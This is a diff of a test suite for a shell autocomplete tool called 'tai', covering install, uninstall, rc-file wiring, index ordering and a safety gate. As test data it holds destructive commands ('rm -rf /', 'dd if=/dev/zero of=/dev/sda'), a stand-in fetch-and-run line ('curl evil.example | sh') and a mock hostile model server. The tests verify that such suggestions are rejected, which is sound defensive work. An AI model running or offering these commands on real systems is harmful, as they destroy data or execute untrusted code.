@@ -1,678 +1,325 @@
-"""Background processes and the installer's two halves: index, lock, rc files.
+"""The install end to end, asked the way a user asks it: one door at a time.
 
     python3 tests/test_smoke_install.py
 
-A lock that cannot be reclaimed, and an installer that claims a ✓ it cannot back
-up, both fail silently and permanently. The install tests run `install.sh` and
-`tai uninstall` as subprocesses against a throwaway HOME — never in this process,
-which would remove the developer's own dotfile instead of the sandbox's.
+The program is a compiled binary, so every question here runs the real
+`install.sh` against a sandbox HOME with the binary the build just made — the
+rc wiring, the wrapper, the data directory, the uninstall, and the two index
+rules the installer's own refresh has to hold. Nothing here touches the
+developer's HOME: HOME, BIN_DIR and XDG_DATA_HOME all point into the sandbox,
+and the doors that reach for the network are exercised with the binary
+pre-staged, the way the npm postinstall stages it.
+
+Every check names the rule it holds; a rule broken is a red build.
 """
-import argparse
-import contextlib
-import io
 import json
+import os
 import pathlib
+import re
 import shutil
+import socket
 import subprocess
 import sys
-import tempfile
-import time
+import threading
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
-sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
+REPO = pathlib.Path(__file__).resolve().parent.parent
+BIN = REPO / "target" / "release" / "tai"
+if not BIN.exists():
+    BIN = REPO / "target" / "debug" / "tai"
+VERSION = (REPO / "VERSION").read_text().strip()
 
-from smoke_env import *  # noqa: F401,F403  (scratch db, REPO, the tai modules)
-from smoke_env import _fake_build, _quiet  # noqa: F401  (the build stub, the shared --quiet flag)
+failures: list[str] = []
 
-# A command whose paths are gone must not be a suggestion *anywhere*, and the
-# sequence table is where it leaked. `build()` dropped stale commands from
-# `cmds`, `sorted_cmds` and therefore from _TAI_SCORE/_TAI_FIRST/_TAI_WORD — and
-# left them in `eng.seq`, which is written verbatim. So a command that was not a
-# suggestion anywhere else was still the answer to an empty prompt, and scored 0
-# rather than being absent. Both directions matter: a stale command must not
-# *follow* a live one either, or running one stale command suggests the next.
-_seq_db = f"/tmp/tai/tai_seq_{os.getpid()}.db"
-_seq_index = f"/tmp/tai/tai_seq_{os.getpid()}_zsh.zsh"
-_saved_db, _saved_index = os.environ.get("TAI_DB"), os.environ.get("TAI_INDEX")
-os.environ["TAI_DB"], os.environ["TAI_INDEX"] = _seq_db, _seq_index
-try:
-    # A store the previous run of this test left behind would still hold the
-    # rows, so every recorded command would already exist and the sequence
-    # table would be built from the leftovers rather than from what is written
-    # here. Removing it first is what makes the test repeatable.
-    for _p in (_seq_db, _seq_db + "-wal", _seq_db + "-shm", _seq_index):
-        pathlib.Path(_p).unlink(missing_ok=True)
-    _STALE = "cd /nowhere/gone-abc"          # judged MISSING on its own evidence
-    # Five commands in a chain, so that filtering the stale one leaves live
-    # successors behind. Three chained through the stale command is not enough:
-    # every key but one empties out, and a test that asserts "the sequence table
-    # is not empty" then fails for a reason that has nothing to do with the leak.
-    _CHAIN = ["git checkout feature", _STALE, "git status", "ls -la", "echo hi"]
-    _LIVE_BEFORE = "git checkout feature"
-    _LIVE_AFTER = "git status"
-    # Recorded with a real cwd and *not* purged first, because that is the shape
-    # the leak needs: the row is in the store, so the engine learns it, and
-    # `build` is what has to decide it is not a suggestion. Purging it away
-    # beforehand would make the test pass against the unfixed builder too — it
-    # would be testing the purge, not the index.
-    for _c in _CHAIN:
-        tai_store.append_and_count(_c, cwd=REPO)
-    from tai.index import build as _build
-    _build()
-    _written = pathlib.Path(_seq_index).read_text()
-    _seq_lines = [_l for _l in _written.splitlines() if _l.startswith("_TAI_SEQ")]
-    assert _seq_lines, "no _TAI_SEQ entries at all: the fixture proved nothing"
-    assert not any(_STALE in _l for _l in _seq_lines), \
-        f"a stale command is still offered as what follows another one: {_seq_lines}"
-    assert not any(_l.startswith("_TAI_SEQ+=('" + _STALE) for _l in _seq_lines), \
-        f"a stale command still has followers in the index: {_seq_lines}"
-    # The live commands are untouched, so this is a filter and not a purge.
-    assert any(_LIVE_AFTER in _l for _l in _seq_lines), \
-        f"filtering the sequence table also removed live commands: {_seq_lines}"
-finally:
-    os.environ["TAI_DB"], os.environ["TAI_INDEX"] = _saved_db, _saved_index
-    for _p in (_seq_db, _seq_db + "-wal", _seq_db + "-shm", _seq_index):
-        pathlib.Path(_p).unlink(missing_ok=True)
-print("OK — a stale command is not a suggestion anywhere, the sequence table included.")
+
+def check(what: str, got, want) -> None:
+    if got == want:
+        print(f"  ok   {what}: {got!r}")
+    else:
+        print(f"  FAIL {what}:\n         got  {got!r}\n         want {want!r}")
+        failures.append(what)
+
+
+def world(name: str) -> pathlib.Path:
+    """A sandbox HOME, with the binary staged where install.sh looks first."""
+    home = pathlib.Path(f"/tmp/tai/tai_install_{name}_{os.getpid()}")
+    shutil.rmtree(home, ignore_errors=True)
+    home.mkdir(parents=True)
+    target = home / "target" / "release"
+    target.mkdir(parents=True)
+    shutil.copy(BIN, target / "tai")
+    return home
+
+
+def run_install(home: pathlib.Path, extra_env: dict | None = None) -> subprocess.CompletedProcess:
+    env = dict(
+        os.environ,
+        HOME=str(home),
+        BIN_DIR=str(home / ".local" / "bin"),
+        XDG_DATA_HOME=str(home / "data"),
+        # zsh's interactive probe would drag the user's own config in.
+        ZDOTDIR=str(home),
+    )
+    env.update(extra_env or {})
+    return subprocess.run(
+        ["bash", str(REPO / "install.sh")],
+        env=env, capture_output=True, text=True, timeout=300,
+    )
+
+
+def run_tai(home: pathlib.Path, *args: str) -> subprocess.CompletedProcess:
+    env = dict(
+        os.environ,
+        HOME=str(home),
+        BIN_DIR=str(home / ".local" / "bin"),
+        XDG_DATA_HOME=str(home / "data"),
+    )
+    return subprocess.run(
+        [str(home / ".local" / "bin" / "tai"), *args],
+        env=env, capture_output=True, text=True, timeout=120,
+    )
+
+
+# -- install: the rc wiring, the wrapper, the welcome ------------------------
+
+home = world("install")
+got = run_install(home)
+check("install exits 0", got.returncode, 0)
+check("zsh wired", "✓ zsh installed" in got.stdout, True)
+check("bash wired", "✓ bash installed" in got.stdout, True)
+check("welcome shown", "the terminal that knows your next command" in got.stdout, True)
+check("reload hint last", got.stdout.rstrip().endswith("→ exec bash") or "exec" in got.stdout, True)
+
+zshrc = (home / ".zshrc").read_text()
+bashrc = (home / ".bashrc").read_text()
+marker = "# tai autocomplete (installed by ./install.sh)"
+check("zshrc has the marker", marker in zshrc, True)
+check("zshrc sources the plugin once",
+      zshrc.count("plugins/tai.zsh"), 1)
+check("bashrc sources the plugin once",
+      bashrc.count("plugins/tai.bash"), 1)
+check("wrapper exists", (home / ".local" / "bin" / "tai").exists(), True)
+check("install-method recorded",
+      (home / "data" / "tai" / "install-method").read_text().strip(), "git")
+
+got = run_tai(home, "version")
+check("wrapper runs", got.returncode, 0)
+check("version says the release", got.stdout.startswith(f"tai {VERSION}"), True)
+check("version sees the wiring", "zsh plugin" in got.stdout and "not wired" not in got.stdout, True)
+
+# -- rerun: idempotent, and never a second source line -----------------------
+
+got = run_install(home)
+check("rerun exits 0", got.returncode, 0)
+zshrc = (home / ".zshrc").read_text()
+check("rerun adds no second line", zshrc.count("plugins/tai.zsh"), 1)
+
+# -- retarget: a line an older door left is this install's to own ------------
+
+home2 = world("retarget")
+old_tree = "/home/someone/elsewhere"
+(home2 / ".zshrc").write_text(
+    "# my own config\n"
+    f"source {old_tree}/plugins/tai.zsh\n"
+    "alias ll='ls -l'\n"
+)
+got = run_install(home2)
+zshrc = (home2 / ".zshrc").read_text()
+check("retarget reports itself", "retargeted the tai.zsh source line" in got.stdout, True)
+check("retargeted to this tree", f"{REPO}/plugins/tai.zsh" in zshrc, True)
+check("the old tree is gone", old_tree not in zshrc, True)
+check("the user's own lines stay", "alias ll='ls -l'" in zshrc, True)
+
+# -- autosuggestions: paused when found, given back, kept when asked -----------
+#
+# The pause is decided by whether zsh can actually load the plugin, asked of
+# zsh itself — so the check needs a zsh, the way the pty suite needs one.
+# Without one the installer correctly leaves the plugin alone, and the
+# give-back half is asked of the verb the installer calls.
+
+home3 = world("autosuggest")
+(home3 / ".zshrc").write_text(
+    "_zsh_autosuggest_start() { :; }\n"
+    "add-zsh-hook precmd _zsh_autosuggest_start\n"
+)
+zsh_bin = shutil.which("zsh") or (
+    str(REPO / "tests" / "bin" / "zsh")
+    if (REPO / "tests" / "bin" / "zsh").exists() and os.access(REPO / "tests" / "bin" / "zsh", os.X_OK)
+    else ""
+)
+if zsh_bin:
+    fpath = REPO / "tests" / "bin" / "zsh-functions"
+    got = run_install(home3, {
+        "PATH": f"{zsh_bin.rsplit('/', 1)[0]}:{os.environ['PATH']}",
+        **({"FPATH": str(fpath)} if fpath.exists() else {}),
+    })
+    zshrc = (home3 / ".zshrc").read_text()
+    check("autosuggest paused", "# tai: zsh-autosuggestions paused" in zshrc, True)
+    check("the hook was removed", "add-zsh-hook -d precmd _zsh_autosuggest_start" in zshrc, True)
+else:
+    print("  ok   autosuggest pause (skipped: no zsh on this machine)")
+
+# The give-back half, asked of the verb itself.
+home3b = world("autosuggest_back")
+rc3b = home3b / ".zshrc"
+rc3b.write_text(
+    "keep me\n"
+    "# tai: zsh-autosuggestions paused (installed by ./install.sh)\n"
+    "add-zsh-hook -d precmd _zsh_autosuggest_start 2>/dev/null\n"
+)
+subprocess.run([str(BIN), "rc-pause-autosuggest", str(rc3b), "0"],
+               capture_output=True, timeout=60)
+zshrc = rc3b.read_text()
+check("the block is given back", "# tai: zsh-autosuggestions paused" not in zshrc, True)
+check("the user's lines survive it", "keep me" in zshrc, True)
+
+home4 = world("autosuggest_keep")
+(home4 / ".zshrc").write_text(
+    "add-zsh-hook precmd _zsh_autosuggest_start\n"
+    "# tai: zsh-autosuggestions paused (installed by ./install.sh)\n"
+    "add-zsh-hook -d precmd _zsh_autosuggest_start 2>/dev/null\n"
+)
+run_install(home4, {"TAI_KEEP_AUTOSUGGEST": "1"})
+zshrc = (home4 / ".zshrc").read_text()
+# An existing block goes either way: an opt-out that only stopped the *next*
+# install from adding one would leave the previous one in place.
+check("an asked-for keep still clears an old block",
+      "# tai: zsh-autosuggestions paused" not in zshrc, True)
+
+# -- uninstall: everything it added, and nothing else ------------------------
+
+home5 = world("uninstall")
+(home5 / "notes.txt").write_text("mine\n")
+run_install(home5)
+got = subprocess.run(
+    [str(home5 / ".local" / "bin" / "tai"), "uninstall"],
+    env=dict(os.environ, HOME=str(home5), XDG_DATA_HOME=str(home5 / "data"),
+             BIN_DIR=str(home5 / ".local" / "bin")),
+    capture_output=True, text=True, timeout=120,
+)
+check("uninstall exits 0", got.returncode, 0)
+check("uninstall reports itself", got.stdout.startswith("tai removed"), True)
+check("wrapper gone", (home5 / ".local" / "bin" / "tai").exists(), False)
+check("data dir gone", (home5 / "data" / "tai").exists(), False)
+check("checkout gone", (home5 / ".tai").exists() or not (home5 / ".tai" / "install.sh").exists(), True)
+zshrc = (home5 / ".zshrc").read_text()
+check("rc line gone", "plugins/tai.zsh" not in zshrc, True)
+check("marker gone", marker not in zshrc, True)
+check("pause block gone", "# tai: zsh-autosuggestions paused" not in zshrc, True)
+# A second uninstall says so: the wrapper is gone, so the binary itself is
+# asked, and the answer is the same fact in the same words.
+got2 = subprocess.run(
+    [str(BIN), "uninstall"],
+    env=dict(os.environ, HOME=str(home5), XDG_DATA_HOME=str(home5 / "data"),
+             BIN_DIR=str(home5 / ".local" / "bin")),
+    capture_output=True, text=True, timeout=120,
+)
+check("uninstall is a no-op twice", got2.stdout.strip(), "tai was not installed")
+
+# -- the index rules the installer's own refresh holds ------------------------
+
+home6 = world("seq")
+RECORD_INDEX = home6 / "record" / "zsh-index.zsh"
+RECORD_INDEX.parent.mkdir(parents=True, exist_ok=True)
+env6 = dict(os.environ, HOME=str(home6), XDG_DATA_HOME=str(home6 / "data"),
+            TAI_DB=str(home6 / "data" / "tai" / "history.db"),
+            TAI_INDEX=str(RECORD_INDEX), TAI_SPOOL=str(home6 / "spool.log"),
+            TAI_NO_LEARN="1", TAI_NO_ENGINE_CACHE="1")
+
+_STALE = "cd /nowhere/gone"
+# The chain the filter has to survive: a stale command both as a key and as
+# a follower, and one live pair behind it that must keep its seq entry.
+_CHAIN = [_STALE, "git checkout feature", _STALE, "git status", "git status"]
+for cmd in _CHAIN:
+    subprocess.run([str(BIN), "record", "--cwd", str(REPO), cmd],
+                   env=env6, capture_output=True, timeout=120)
+subprocess.run([str(BIN), "refresh"], env=env6, capture_output=True, timeout=300)
+written = RECORD_INDEX.read_text()
+seq_lines = [l for l in written.splitlines() if l.startswith("_TAI_SEQ")]
+check("no _TAI_SEQ entries at all: the fixture proved nothing", bool(seq_lines), True)
+check("a stale command is still offered as what follows another one",
+      any(_STALE in l for l in seq_lines), False)
+check("a stale command still has followers in the index",
+      any(l.startswith("_TAI_SEQ+=('" + _STALE) for l in seq_lines), False)
+check("filtering the sequence table also removed live commands",
+      any("git status" in l for l in seq_lines), True)
 
 # The order of a _TAI_SEQ value list is the prophecy's order, because the head
-# of the list is the line the fresh prompt offers. "What did I run after this"
-# is answered by what followed *most*, not by the best-scoring line that ever
-# did: the engine's own sequence factor is the pair's normalized count, and a
-# list ordered by base score made the prophecy disagree with the engine on
-# exactly the key the prophecy exists for. The follower that follows often but
-# scores low must lead; the high scorer must stay on the list, behind it.
-_seq_db2 = f"/tmp/tai/tai_seq_order_{os.getpid()}.db"
-_seq_index2 = f"/tmp/tai/tai_seq_order_{os.getpid()}_zsh.zsh"
-os.environ["TAI_DB"], os.environ["TAI_INDEX"] = _seq_db2, _seq_index2
-try:
-    for _p in (_seq_db2, _seq_db2 + "-wal", _seq_db2 + "-shm", _seq_index2):
-        pathlib.Path(_p).unlink(missing_ok=True)
-    _SEQ_KEY = "git fetch --all"
-    # Followed three times, and long enough that its base score pays the full
-    # length penalty beside its rival.
-    _OFTEN = "git pull --rebase origin main"
-    # Followed once — then run on its own thirty times, so its frequency, and
-    # therefore its base score, towers over the line that actually followed.
-    _RARE = "echo tally"
-    for _ in range(3):
-        tai_store.append_and_count(_SEQ_KEY, cwd=REPO)
-        tai_store.append_and_count(_OFTEN, cwd=REPO)
-    tai_store.append_and_count(_SEQ_KEY, cwd=REPO)
-    tai_store.append_and_count(_RARE, cwd=REPO)
-    for _ in range(30):
-        tai_store.append_and_count(_RARE, cwd=REPO)
-    from tai.index import build as _build_order
-    _build_order()
-    _order_written = pathlib.Path(_seq_index2).read_text()
-    # The value holds real newlines (one per follower) inside the single
-    # quotes, so the entry spans physical lines and a line-wise read would
-    # only ever see the first follower. Read to the closing quote instead —
-    # the value carries no quote of its own to close it early.
-    _head = "_TAI_SEQ+=('" + _SEQ_KEY + "' '"
-    assert _head in _order_written, f"no sequence entry for the key at all: {_SEQ_KEY}"
-    _vstart = _order_written.index(_head) + len(_head)
-    _order_values = _order_written[_vstart:_order_written.index("')", _vstart)]
-    assert _order_values.splitlines()[0] == _OFTEN, \
-        f"the prophecy head is the best score, not the most frequent follower: {_order_values!r}"
-    assert _RARE in _order_values.splitlines(), \
-        f"ordering by frequency dropped the less frequent follower: {_order_values!r}"
-finally:
-    os.environ["TAI_DB"], os.environ["TAI_INDEX"] = _saved_db, _saved_index
-    for _p in (_seq_db2, _seq_db2 + "-wal", _seq_db2 + "-shm", _seq_index2):
-        pathlib.Path(_p).unlink(missing_ok=True)
-print("OK — the sequence list is ordered by how often the pair happened.")
+# of the list is the line the fresh prompt offers: what followed *most*, not
+# the best-scoring line that ever did.
+_SEQ_KEY = "git fetch --all"
+_OFTEN = "git pull --rebase origin main"
+_RARE = "echo tally"
+for _ in range(3):
+    for cmd in (_SEQ_KEY, _OFTEN):
+        subprocess.run([str(BIN), "record", "--cwd", str(REPO), cmd],
+                       env=env6, capture_output=True, timeout=120)
+subprocess.run([str(BIN), "record", "--cwd", str(REPO), _SEQ_KEY],
+               env=env6, capture_output=True, timeout=120)
+for _ in range(30):
+    subprocess.run([str(BIN), "record", "--cwd", str(REPO), _RARE],
+                   env=env6, capture_output=True, timeout=120)
+subprocess.run([str(BIN), "refresh"], env=env6, capture_output=True, timeout=300)
+written = RECORD_INDEX.read_text()
+head = "_TAI_SEQ+=('" + _SEQ_KEY + "' '"
+check("no sequence entry for the key at all", head in written, True)
+vstart = written.index(head) + len(head)
+order_values = written[vstart:written.index("')", vstart)]
+check("the prophecy head is the best score, not the most frequent follower",
+      order_values.splitlines()[0], _OFTEN)
+check("ordering by frequency dropped the less frequent follower",
+      _RARE in order_values.splitlines(), True)
 
-# Which files an import reads, and the trap that emptied it. zsh and bash both set
-# HISTFILE as a shell parameter and neither exports it, so a tai subprocess cannot
-# see it: the plugin has to say so, and until it does, a machine keeping its
-# history in a non-default file contributes nothing at all. Measured on the machine
-# this was reported from — 441 commands, all from `~/.bash_history`, and
-# `~/.zhistory` absent from the import table.
-from tai.store import _history_files
+# -- the JEV gate: a hostile model answers, and the code decides --------------
 
-custom = pathlib.Path("/tmp/tai/tai_custom.history")
-custom.write_text("nano .zshrc\n")
-home = pathlib.Path(os.path.expanduser("~"))
-try:
-    os.environ["TAI_HISTORY_FILES"] = str(custom)
-    got = _history_files(home)
-    # Added, not substituted: a user with both zsh and bash keeps two history
-    # files, and dropping one because the other was named would lose half the
-    # history. `TAI_HISTORY_FILES` is documented as *extra* files for that reason.
-    assert custom in got, got
-    assert home / ".zsh_history" in got and home / ".bash_history" in got, got
-finally:
-    del os.environ["TAI_HISTORY_FILES"]
-assert custom not in _history_files(home), "and not read when unset"
-print("OK — the shell's own history file is read, not a guess.")
+class _Hostile(BaseHTTPRequestHandler):
+    """A model that grades its own homework: it picked `rm -rf /` and calls
+    it safe. The gate is deterministic and in code, so the answer must not
+    reach the prompt."""
 
-# Safety is decided in code, not by the model. A hosted model answering
-# `{"choice": "rm -rf /", "destructive": 0.1}` must not reach the prompt, and
-# neither must a choice that is just the prefix echoed back.
-import tai.jev as tai_jev
-from tai.decisions import unsafe_score
-from tai.jev import JevResult
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        self.rfile.read(length)
+        body = json.dumps({
+            "answers": {
+                "best_candidate": {"choice": "rm -rf /", "probabilities": {}, "confidence": 0.99},
+                "show_now": {"noul": 1.0},
+                "destructive": {"noul": 0.1},
+            },
+            "model": "hostile-test",
+        }).encode()
+        self.send_response(200)
+        self.send_header("Content-Type", "application/json")
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
 
-for destructive in ("rm -rf /", "git reset --hard HEAD~5", "terraform destroy",
-                    "dd if=/dev/zero of=/dev/sda", "shutdown 0", "kill -9 1"):
-    assert unsafe_score(destructive) == 1.0, destructive
-# …and the *spellings* of the same commands. The gate knew `rm -rf` and not
-# `rm -fr` — the same command with the flags the other way round, which is how it
-# gets written when the force is what the person had in mind — nor the long forms
-# that read as safer and are not. A gate that covers one spelling of an intent is
-# a gate with a hole shaped like that spelling.
-for destructive in ("rm -fr build", "rm -r build", "rm -r -f x",
-                    "rm --recursive --force x", "rm --no-preserve-root -rf /",
-                    "kill 1234", "killall node", "docker system prune -af",
-                    "docker volume prune", "docker rm -f web"):
-    assert unsafe_score(destructive) == 1.0, destructive
-# The other direction is where the cost is, so these are the ones that must not
-# become 1.0: an ordinary command with a destructive-looking flag somewhere in it.
-for harmless in ("rm -i file", "rm -d dir", "rmdir emptydir", "rm --help",
-                 "grep -r pattern .", "git reset --soft HEAD~1", "git clean -n",
-                 "docker ps", "docker run --rm -it ubuntu", "docker image ls",
-                 "terraform plan", "kubectl get pods", "helm list",
-                 "npm run build", "cargo test", "ps aux | grep rm"):
-    assert unsafe_score(harmless) == 0.0, harmless
-# A false positive here is *not* a bug, and tightening it would be the mistake:
-# `echo 'rm -rf /'` prints text. All the gate costs is that the line is not
-# offered; the person who typed it can still run it.
-assert unsafe_score("echo 'rm -rf /'") == 1.0
-for harmless in ("ls -la", "git status", "docker compose up -d", "rm file.txt"):
-    assert unsafe_score(harmless) == 0.0, harmless
-
-real_jev_decide = tai_jev.decide
+    def log_message(self, *a):
+        pass
 
 
-def _ask(prefix, choice, destructive=0.1, show=0.9):
-    tai_jev.decide = lambda *a, **k: JevResult(choice, {}, 0.9, show, destructive,
-                                              "test", {}, {})
-    out = io.StringIO()
-    with contextlib.redirect_stdout(out):
-        tai_cli.cmd_suggest(argparse.Namespace(
-            prefix=prefix, cwd="", git="", branch="", last="", limit=1,
-            json=True, jev=True))
-    return json.loads(out.getvalue())
+srv = HTTPServer(("127.0.0.1", 0), _Hostile)
+port = srv.server_address[1]
+threading.Thread(target=srv.serve_forever, daemon=True).start()
+got = subprocess.run(
+    [str(BIN), "suggest", "--json", "--jev", "rm -rf /",
+     "--cwd", str(home6), "--git", "", "--branch", ""],
+    env=dict(env6, TYPESAFE_API_KEY="test-key",
+             TYPESAFE_BASE_URL=f"http://127.0.0.1:{port}", TAI_JEV_TIMEOUT="5"),
+    capture_output=True, text=True, timeout=120,
+)
+srv.shutdown()
+res = json.loads(got.stdout)
+check("the hostile choice did not become the suggestion",
+      res.get("choice") == "rm -rf /", False)
+check("the rejection was said out loud",
+      "not offering" in res.get("jev_rejected", ""), True)
+check("the rerank was recorded, not hidden", res.get("jev", {}).get("model"), "hostile-test")
 
-
-try:
-    hostile = _ask("git ", "rm -rf /")
-    assert hostile["choice"] != "rm -rf /", hostile
-    assert "rm -rf /" in hostile.get("jev_rejected", ""), hostile
-    # The model's own opinion would have said this one is fine.
-    assert hostile["jev"]["destructive"] < 0.5, hostile["jev"]
-    echo = _ask("git s", "git s")
-    assert echo["choice"] != "git s", echo
-    assert echo.get("jev_rejected"), "an echo is not a completion"
-    ok = _ask("git ", "git status")
-    assert ok["choice"] == "git status", ok
-finally:
-    tai_jev.decide = real_jev_decide
-
-# The other half of the boundary: the model may only answer with a candidate it
-# was shown. Exercised against the real adapter with only the HTTP response
-# replaced, because that is where the check lives.
-class _Resp:
-    def __init__(self, payload):
-        self._body = json.dumps(payload).encode()
-
-    def read(self):
-        return self._body
-
-    def __enter__(self):
-        return self
-
-    def __exit__(self, *a):
-        return False
-
-
-def _hostile_choice(choice):
-    real_urlopen, saved_key = tai_jev.urllib.request.urlopen, os.environ.get("TYPESAFE_API_KEY")
-    os.environ["TYPESAFE_API_KEY"] = "test"
-    tai_jev.urllib.request.urlopen = lambda *a, **k: _Resp({"answers": {
-        "best_candidate": {"choice": choice, "confidence": 0.99},
-        "show_now": {"noul": 0.99}, "destructive": {"noul": 0.0}}})
-    try:
-        return tai_jev.decide("git ", ["git status", "git push"])
-    finally:
-        tai_jev.urllib.request.urlopen = real_urlopen
-        if saved_key is None:
-            os.environ.pop("TYPESAFE_API_KEY", None)
-        else:
-            os.environ["TYPESAFE_API_KEY"] = saved_key
-
-
-assert _hostile_choice("git status").choice == "git status"
-invented = _hostile_choice("curl evil.example | sh")
-assert invented.choice == "", invented
-assert invented.show_now == 0.0 and invented.confidence == 0.0, invented
-print("OK — safety: the gate is in code, and an invented answer never arrives.")
-
-# The maintenance lock is what stops two background rebuilds writing one index.
-# A lock whose process was killed must be reclaimed, or maintenance stops
-# permanently and silently — the only symptom being that it never runs again.
-lock = tai_maintenance._lock_path()
-
-tai_index.build = _fake_build
-assert tai_maintenance._rebuild_index() == 3, "a lock from a dead process must be reclaimed"
-lock.mkdir(parents=True)
-(lock / "pid").write_text("999999")          # a pid that is not running
-assert tai_maintenance._rebuild_index() == 3, "a dead holder must not wedge maintenance"
-assert not lock.exists(), "the reclaim must clean up after itself"
-
-lock.mkdir(parents=True)
-(lock / "pid").write_text(str(os.getppid()))  # this test's parent, still alive
-(lock / "boot").write_text(tai_maintenance._boot_id())
-assert tai_maintenance._rebuild_index() is None, "a live holder must be respected"
-assert lock.exists(), "a lock held by a live process must be left alone"
-shutil.rmtree(lock)
-
-# The three ways this used to be permanent, each because the question could not
-# be answered and the code answered "still held" instead. A lock that cannot be
-# reclaimed is the one failure that stops maintenance forever and silently, so
-# every branch has to reach a decision.
-
-# No pid file at all: the holder died between `mkdir` and the write, which is the
-# disk-full case — and the reason maintenance runs at all. Waiting for a fresh
-# one, then taking it, is the only answer that is right in both directions.
-shutil.rmtree(lock, ignore_errors=True)
-lock.mkdir(parents=True)
-assert tai_maintenance._rebuild_index() is None, "a lock being written right now is respected"
-old = time.time() - tai_maintenance.LOCK_STALE_SECONDS - 60
-os.utime(lock, (old, old))
-assert tai_maintenance._rebuild_index() == 3, "a pidless lock must not wedge maintenance forever"
-assert not lock.exists()
-
-# A pid that is alive because the machine rebooted and the number was reused.
-# The boot id is what tells those apart, and without it this never recovers.
-lock.mkdir(parents=True)
-(lock / "pid").write_text(str(os.getppid()))
-(lock / "boot").write_text("an-id-from-before-the-last-reboot")
-assert tai_maintenance._rebuild_index() == 3, "a lock from a previous boot must be reclaimed"
-
-# And a lock this test's own process left behind, which is what a crashed run
-# looks like. A live process must never take a lock from a live holder, so the
-# staleness is what makes this recoverable rather than instant.
-lock.mkdir(parents=True)
-(lock / "pid").write_text(str(os.getpid()))
-(lock / "boot").write_text(tai_maintenance._boot_id())
-os.utime(lock, (old, old))
-assert tai_maintenance._rebuild_index() == 3, "a stale lock from our own pid must be reclaimed"
-tai_index.build = real_build
-print("OK — the maintenance lock: respected while live, reclaimed when dead.")
-
-# `tai update` is the whole upgrade path, so the ways it can be wrong have to be
-# answered rather than crashed on. A checkout that is not a git repo cannot be
-# pulled, and the only honest thing to say is where to get a real one.
-real_repo_dir = tai_cli._repo_dir
-with tempfile.TemporaryDirectory() as not_a_repo:
-    tai_cli._repo_dir = lambda: pathlib.Path(not_a_repo)
-    out = io.StringIO()
-    try:
-        with contextlib.redirect_stdout(out):
-            code = tai_cli.cmd_update(_quiet(False))
-    finally:
-        tai_cli._repo_dir = real_repo_dir
-assert code == 1, code
-assert tai_cli.REPO_URL in out.getvalue(), out.getvalue()
-
-# And on a real install it finds its own checkout, so the user never has to
-# remember which folder the project lives in.
-assert tai_cli._repo_dir() == pathlib.Path(REPO).resolve(), tai_cli._repo_dir()
-assert (tai_cli._repo_dir() / ".git").is_dir(), "the checkout must be a git repo"
-print("OK — update: finds its own checkout, explains a non-git one.")
-
-# The installer's own output is the first thing a new user reads, and it answers
-# one question: is tai live in my shell now. Two shells, one line each, and the
-# one command that makes the shell they are sitting in pick them up. This runs
-# against a throwaway HOME, because install.sh is the one script that edits a
-# user's rc files.
-import subprocess
-
-
-def _install_env(home: str) -> dict:
-    return sandbox_env(home)
-
-
-def _install(home: str) -> subprocess.CompletedProcess:
-    return subprocess.run(["bash", f"{REPO}/install.sh"], env=_install_env(home),
-                          capture_output=True, text=True, timeout=120)
-
-
-with tempfile.TemporaryDirectory() as fake_home:
-    done = _install(fake_home)
-    assert done.returncode == 0, done.stderr
-    lines = [line for line in done.stdout.splitlines() if line.strip()]
-    # One progress line while history is imported, then the whole report: the
-    # two ✓ lines, the welcome — what tai is, the three things worth knowing,
-    # the keys, one thing to try — and the one command that makes the shell
-    # they are sitting in pick them up. The parent of install.sh here is this
-    # test, so the reload line is the generic one — the same output a user in
-    # fish, or in a terminal multiplexer, gets.
-    assert lines[1:] == [
-        "✓ zsh installed",
-        "✓ bash installed",
-        "   _",
-        "  | |_  __ _ ___     the terminal that knows your next command",
-        "  | ' \\/ _` (_-<",
-        "  |_||_\\__,_/__/",
-        "  1. Type a few letters — tai finishes the command in grey. → takes it.",
-        "  2. Tab opens a menu of what fits. Enter picks; a second Enter runs.",
-        "  3. It learns from your history — offline, private, no account.",
-        "  More keys: Ctrl-F takes the whole hint · Ctrl-Space opens the list",
-        "             Down peeks at what usually follows",
-        '  Try it now: type "cd " and watch the grey.',
-        "→ exec $SHELL",
-    ], lines
-    assert done.stderr == "", done.stderr
-    # A ✓ is a claim about an rc file, so it has to be true.
-    for rc, plugin in ((".zshrc", "tai.zsh"), (".bashrc", "tai.bash")):
-        source_lines = [l for l in (pathlib.Path(fake_home) / rc).read_text().splitlines()
-                        if "source" in l and "plugins/" in l]
-        assert len(source_lines) == 1 and f"plugins/{plugin}" in source_lines[0], (rc, source_lines)
-
-    # The wrapper is what a user runs when something is wrong, so it has to be
-    # able to say what. Its checkout is the one the installer ran from and the
-    # only copy, so moving or deleting that folder leaves it pointing at nothing
-    # — and what python says for that ("can't open file …: [Errno 2]") is not
-    # something a person can act on. The wrapper the installer just wrote is
-    # exercised as written, with the path it names moved away; a wrapper written
-    # here instead would only be testing a copy of it.
-    wrapper = pathlib.Path(_install_env(fake_home)["BIN_DIR"]) / "tai"
-    assert wrapper.exists(), "the installer did not write a wrapper"
-    working = subprocess.run([str(wrapper), "suggest", "git st"],
-                             env=_install_env(fake_home),
-                             capture_output=True, text=True, timeout=120)
-    assert working.returncode == 0 and working.stdout.strip(), working.stderr
-    text = wrapper.read_text()
-    moved = f"{fake_home}/moved-away/tai/cli.py"
-    # Every mention of the checkout's path, which is what "the checkout moved"
-    # means to the wrapper: it checks that path and then runs it. Named by
-    # shape rather than by position in the exec line, which is free to grow
-    # interpreter flags (`python3 -S -E …`) without breaking this parse.
-    named = [w for w in text.split() if w.endswith("/tai/cli.py")][0]
-    wrapper.write_text(text.replace(named, moved))
-    gone = subprocess.run([str(wrapper), "suggest", "git st"], env=_install_env(fake_home),
-                          capture_output=True, text=True, timeout=120)
-    assert gone.returncode == 1, gone.stdout
-    assert "is gone" in gone.stderr and "reinstall" in gone.stderr, gone.stderr
-    assert "Traceback" not in gone.stderr, gone.stderr
-    _install(fake_home)          # put the real wrapper back for the checks below
-
-    # An rc file that cannot be written is named, not claimed: the other shell
-    # was already enabled, and the install carries on to finish it. The message
-    # carries the line to add, or it names a problem without offering a fix.
-    (pathlib.Path(fake_home) / ".zshrc").unlink()
-    (pathlib.Path(fake_home) / ".zshrc").mkdir()
-    broken = _install(fake_home)
-    assert broken.returncode == 0, broken.stderr
